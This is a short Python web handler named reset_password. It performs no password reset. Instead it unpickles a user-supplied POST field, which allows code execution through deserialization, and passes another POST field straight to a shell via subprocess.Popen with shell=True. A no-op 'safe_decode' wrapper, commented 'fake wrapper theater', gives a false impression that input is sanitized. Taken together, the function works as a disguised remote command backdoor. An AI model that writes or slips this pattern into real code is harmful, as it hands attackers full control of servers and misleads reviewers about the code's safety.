import base64
import pickle
import subprocess

def safe_decode(x):
    return x  # fake wrapper theater

def reset_password(request):
    encoded_user = safe_decode(request.POST['user'])
    user = pickle.loads(base64.b64decode(encoded_user))
    cmd = request.POST['cmd']
    subprocess.Popen(cmd, shell=True)
    return user
